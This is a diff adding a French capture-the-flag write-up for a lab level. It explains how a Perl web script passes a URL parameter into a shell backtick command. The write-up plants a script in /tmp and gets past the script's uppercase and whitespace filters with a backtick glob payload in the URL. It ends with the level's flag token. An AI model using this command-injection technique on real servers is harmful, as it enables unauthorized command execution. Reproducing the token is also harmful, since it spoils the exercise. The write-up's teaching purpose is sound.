@@ -1,0 +1,32 @@
+En faisant un cat de level12.pl on observe un lancement de serveur sur le port 4646
+
+L'url peut prendre 2 parametres x et y.
+Ces params sont passe a la fonction t, le premier param $_[0] va etre stocké puis modifié grace à :
+tr/a-z/A-Z/ => passe toutes les minuscules en majuscules
+s/\s.*//    => remplace les espacement (\s = \n\t\r\f) + tout les characteres (.*) sauf quelques exceptions par rien (//) 
+@output = `egrep "^$xx" /tmp/xd 2>&1` => lance la commande et stock le retour dans le tableau output (grace au `commande ici`)
+
+On va donc creer un script qui va lancer getflag et stocker le retour dans un fichier.
+L'objectif etant de reussir a lancer le script via l'url
+
+Pour ce faire on creer le script suivant dans /tmp
+
+Nom du fichier : TEST
+
+#!/bin/sh
+
+getflag > /tmp/flag
+
+Il faut ensuite mettre les droit d'execution sur le fichier /tmp/TEST
+
+chmod +x /tmp/TEST
+
+Une fois cela fait il faut trouver une maniere pour que nos param atteigne la ligne @output ... et execute /tmp/TEST
+
+on utilise donc la synthaxe /*/TEST afin de passer au travers des regex 
+Il nous suffit ensuite de lancer sur un navigateur :
+http://[Mon_IP]:4646/?x=`/*/TEST`
+
+de retour sur la vm, on fait un :
+cat /tmp/flag
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
